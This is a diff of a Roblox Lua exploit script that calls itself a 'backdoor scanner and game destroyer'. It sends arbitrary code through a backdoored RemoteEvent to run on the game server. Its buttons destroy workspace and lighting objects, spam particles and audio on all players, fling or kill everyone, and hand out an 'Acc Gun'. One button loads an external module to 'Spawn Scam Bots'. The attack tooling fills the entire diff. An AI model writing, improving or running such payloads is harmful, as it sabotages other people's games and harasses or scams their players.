@@ -1,7 +1,7 @@
 ---------- PLEASE DO NOT SHARE THIS SCRIPT WITH ANYBODY IF YOU FOUND IT, THANKS. ----------
 
 
--- pog!!! the fastest backdoor scannner and game destroyer
+-- pog!!! backdoor scannner and game destroyer
 -- v0.9
 
 
@@ -194,6 +194,23 @@ end
 -- Original functions modified to use RemoteEvent
 local function applyEffectsEverywhere()
     fireRemoteEvent([[
+		local function createParticlesOnPlayer(player)
+    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        local rootPart = player.Character.HumanoidRootPart
+        for _, child in ipairs(rootPart:GetChildren()) do
+            if child:IsA("ParticleEmitter") then
+                child:Destroy()
+            end
+        end
+        local particle = Instance.new("ParticleEmitter")
+        particle.Texture = "rbxassetid://125414307215852"
+        particle.Rate = 800
+        particle.Speed = NumberRange.new(12,12)
+        particle.Lifetime = NumberRange.new(5, 5)
+        particle.VelocitySpread = 360
+        particle.Parent = rootPart
+    end
+end
         for _, part in pairs(workspace:GetDescendants()) do
             if part:IsA("BasePart") or part:IsA("MeshPart") then
                 for _, face in pairs({"Front", "Back", "Top", "Bottom", "Left", "Right"}) do
@@ -204,6 +221,9 @@ local function applyEffectsEverywhere()
                 end
             end
         end
+		for _, player in pairs(game.Players:GetPlayers()) do
+			createParticlesOnPlayer(player)
+		end
     ]])
 end
 
@@ -223,7 +243,7 @@ end
 local function startMusic()
     fireRemoteEvent([[
         local sound = Instance.new("Sound", workspace)
-        sound.SoundId = "rbxassetid://132124181828375"
+        sound.SoundId = "rbxassetid://1839246711"
         sound.Volume = 3
         sound.Looped = true
         sound:Play()
@@ -394,8 +414,8 @@ BTN72.MouseButton1Click:Connect(function()
     fireRemoteEvent([[
 
 		for _, player in pairs(game.Players:GetPlayers()) do
-            require(129414474541336).accgun(player.Name)
-        end
+			game.ReplicatedStorage:FindFirstChild("AccountGun"):Clone().Parent = player.Backpack
+		end
     ]])
 end)
 BTN71.MouseButton1Click:Connect(function()
@@ -450,11 +470,7 @@ BTN16.MouseButton1Click:Connect(function()
     ]])
 end)
 BTN17.MouseButton1Click:Connect(function()
-    if game:GetService("TextChatService"):FindFirstChild("TextChannels") and game.TextChatService.TextChannels:FindFirstChild("RBXGeneral") then
-            game.TextChatService.TextChannels.RBXGeneral:SendAsync("ReplicateClientation fixed this game 👍")
-        elseif game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
-            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ReplicateClientation fixed this game 👍", "All")
-        end
+    fireRemoteEvent("require(107444113827157).scam()")
 end)
 BTN18.MouseButton1Click:Connect(flingPlayer)
 BTN9.MouseButton1Click:Connect(function()
@@ -497,28 +513,59 @@ end)
 
 BTN12.MouseButton1Click:Connect(function()
     fireRemoteEvent([[
-        for _, obj in pairs(workspace:GetDescendants()) do
-            if obj:IsA("Message") or obj:IsA("Hint") or obj:IsA("Decal") or obj:IsA("BillboardGui") or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Fire") or obj:IsA("SelectionBox") or obj:IsA("Sound") or obj:IsA("PointLight") or obj:IsA("SurfaceLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceGui") or obj:IsA("ScreenGui") or obj:IsA("Explosion") or obj:IsA("Tool") or obj:IsA("Forcefield") or obj:IsA("Sparkle") or obj:IsA("Highlight") then
+        task.spawn(function() 
+        local desc = workspace:GetDescendants()
+        for i = 1, #desc do
+            local obj = desc[i]
+            if (obj:IsA("Message") or obj:IsA("Hint") or obj:IsA("Decal") or obj:IsA("BillboardGui") 
+            or obj:IsA("Texture") or obj:IsA("ParticleEmitter") or obj:IsA("Fire") 
+            or obj:IsA("SelectionBox") or obj:IsA("Sound") or obj:IsA("PointLight") 
+            or obj:IsA("SurfaceLight") or obj:IsA("SpotLight") or obj:IsA("SurfaceGui") 
+            or obj:IsA("ScreenGui") or obj:IsA("Explosion") or obj:IsA("Tool") 
+            or obj:IsA("Forcefield") or obj:IsA("Sparkle") or obj:IsA("Highlight")) and obj.Name ~= "face" then
                 obj:Destroy()
             end
-        end
-        for _, obj in pairs(game.Lighting:GetDescendants()) do
-            if obj:IsA("PostEffect") or obj:IsA("BloomEffect") or obj:IsA("ColorCorrectionEffect") or obj:IsA("Sky") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") or obj:IsA("Atmosphere") or obj:IsA("DepthOfFieldEffect") then
+
+            if (obj:IsA("Part") or obj:IsA("MeshPart")) 
+            and obj.Size.Magnitude > Vector3.new(6,6,6).Magnitude 
+            and obj.Material ~= Enum.Material.Grass and obj.Material ~= Enum.Material.Wood and obj.Material ~= Enum.Material.WoodPlanks and obj.Material ~= Enum.Material.Slate and obj.Material ~= Enum.Material.DiamondPlate and obj.Material ~= Enum.Material.Concrete and obj.Shape == Enum.PartType.Ball then
                 obj:Destroy()
             end
+
+            if i % 50 == 0 then
+                task.wait(0.02)
+            end
         end
-        game.Lighting.Ambient = Color3.fromRGB(127, 127, 127)
-        game.Lighting.Brightness = 3
-        game.Lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
-        game.Lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
-        game.Lighting.ClockTime = 14
-        game.Lighting.GeographicLatitude = 41.733
-        game.Lighting.FogColor = Color3.fromRGB(192, 192, 192)
-        game.Lighting.FogEnd = 10000
-        game.Lighting.FogStart = 0
-        game.Lighting.GlobalShadows = true
-        game.Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
-        game.Lighting.ExposureCompensation = 0
+
+        local lightingDesc = game.Lighting:GetDescendants()
+        for i = 1, #lightingDesc do
+            local obj = lightingDesc[i]
+            if obj:IsA("PostEffect") or obj:IsA("BloomEffect") or obj:IsA("ColorCorrectionEffect") 
+            or obj:IsA("Sky") or obj:IsA("SunRaysEffect") or obj:IsA("BlurEffect") 
+            or obj:IsA("Atmosphere") or obj:IsA("DepthOfFieldEffect") or obj.Name == "sbann" then
+                obj:Destroy()
+            end
+
+            if i % 50 == 0 then
+                task.wait(0.02)
+            end
+        end
+
+        local lighting = game.Lighting
+        lighting.Ambient = Color3.fromRGB(127, 127, 127)
+        lighting.Brightness = 3
+        lighting.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+        lighting.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+        lighting.ClockTime = 14
+        lighting.GeographicLatitude = 41.733
+        lighting.FogColor = Color3.fromRGB(192, 192, 192)
+        lighting.FogEnd = 10000
+        lighting.FogStart = 0
+        lighting.GlobalShadows = true
+        lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+        lighting.ExposureCompensation = 0
+    end)
+
     ]])
 end)
 -- Upgraded UI layout and styling
@@ -668,9 +715,11 @@ styleButton(BTN71)
 BTN71.Text = "Modified LALOL"
 BTN71.Parent = ScrollingFrame
 
-styleButton(BTN72)
-BTN72.Text = "Give Everyone Acc Gun"
-BTN72.Parent = ScrollingFrame
+if game.ReplicatedStorage:FindFirstChild("AccountGun") then
+	styleButton(BTN72)
+    BTN72.Text = "Give Everyone Acc Gun"
+    BTN72.Parent = ScrollingFrame
+end
 
 styleButton(BTN15)
 BTN15.Text = "TP To realm (probably wont work)"
@@ -681,8 +730,9 @@ BTN16.Text = "1x1x1x1 reference (kill all)"
 BTN16.Parent = ScrollingFrame
 
 styleButton(BTN17)
-BTN17.Text = "Say in chat ReplicateClientation fixed this game 👍"
+BTN17.Text = "Spawn Scam Bots"
 BTN17.Parent = ScrollingFrame
+
 styleButton(BTN18)
 BTN18.Text = "Fling everyone"
 BTN18.Parent = ScrollingFrame
